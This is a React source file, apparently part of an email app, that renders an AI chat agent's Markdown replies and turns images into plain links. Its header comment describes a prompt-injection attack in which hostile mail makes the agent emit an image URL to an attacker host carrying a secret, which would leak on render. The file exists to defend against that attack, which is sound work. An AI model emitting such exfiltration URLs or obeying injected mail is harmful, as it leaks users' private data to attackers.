// Copyright (c) 2026 Cloudflare, Inc.
// Licensed under the Apache 2.0 license found in the LICENSE file or at:
//     https://opensource.org/licenses/Apache-2.0
/** @jsxRuntime automatic @jsxImportSource react */
// ^ pins the automatic JSX runtime so the unit tests (tsx) render this file as the app does.

import Markdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { useMemo } from "react";
import { useT } from "../lib/i18n";
import { englishT, type T } from "../../shared/i18n";

/**
 * Markdown for the chat agent's replies.
 *
 * The agent reads untrusted mail, so a hostile message can make it emit
 * `![](https://attacker/?d=<secret>)`. A rendered <img> would fetch that URL
 * the moment the reply appears, leaking whatever the agent put in it without
 * a click. Images are therefore never rendered: each becomes a plain link the
 * reader can see and choose to open. Raw HTML stays off (no rehype-raw), and
 * react-markdown's URL transform still drops `javascript:` and similar URLs.
 */

function hostOf(src: string): string | null {
	try {
		return new URL(src).host || null;
	} catch {
		return null;
	}
}

export function imageLinkLabel(alt: string | null | undefined, src: string | null | undefined, t: T = englishT): string {
	const name = alt?.trim();
	const host = src ? hostOf(src) : null;
	if (name && host) return t("Image: {name} ({host})", { name, host });
	if (name) return t("Image: {name}", { name });
	if (host) return t("Image from {host}", { host });
	return t("Image");
}

const linkStyle = { color: "var(--color-link)", textDecoration: "underline" } as const;

/** The renderers; only an image's link label depends on the language. */
const componentsFor = (t: T): Components => ({
	a: ({ href, children }) => (
		<a href={href} target="_blank" rel="noopener noreferrer" style={linkStyle}>
			{children}
		</a>
	),
	img: ({ src, alt }) => {
		const href = typeof src === "string" ? src : undefined;
		const label = imageLinkLabel(alt, href, t);
		return href ? (
			<a
				href={href}
				target="_blank"
				rel="noopener noreferrer nofollow"
				referrerPolicy="no-referrer"
				style={linkStyle}
			>
				{label}
			</a>
		) : (
			<span>{label}</span>
		);
	},
	p: ({ children }) => <p className="mb-2 last:mb-0">{children}</p>,
	strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
	ul: ({ children }) => (
		<ul className="list-disc pl-4 mb-2 last:mb-0 space-y-0.5">{children}</ul>
	),
	ol: ({ children }) => (
		<ol className="list-decimal pl-4 mb-2 last:mb-0 space-y-0.5">{children}</ol>
	),
	li: ({ children }) => <li>{children}</li>,
	h1: ({ children }) => <h3 className="font-semibold text-sm mb-1">{children}</h3>,
	h2: ({ children }) => <h4 className="font-semibold text-[13px] mb-1">{children}</h4>,
	h3: ({ children }) => <h5 className="font-semibold text-[13px] mb-0.5">{children}</h5>,
	code: ({ children }) => (
		<code className="bg-kumo-fill px-1 py-0.5 rounded text-[12px]">{children}</code>
	),
	table: ({ children }) => (
		<div className="overflow-x-auto my-2">
			<table className="w-full text-xs border-collapse">{children}</table>
		</div>
	),
	thead: ({ children }) => (
		<thead className="border-b border-kumo-line bg-kumo-fill/30">{children}</thead>
	),
	th: ({ children }) => (
		<th className="text-left px-2 py-1 font-semibold text-kumo-strong">{children}</th>
	),
	td: ({ children }) => (
		<td className="px-2 py-1 border-b border-kumo-line/50">{children}</td>
	),
});

export default function AgentMarkdown({ children }: { children: string }) {
	const t = useT();
	const components = useMemo(() => componentsFor(t), [t]);
	return (
		<Markdown remarkPlugins={[remarkGfm]} components={components}>
			{children}
		</Markdown>
	);
}
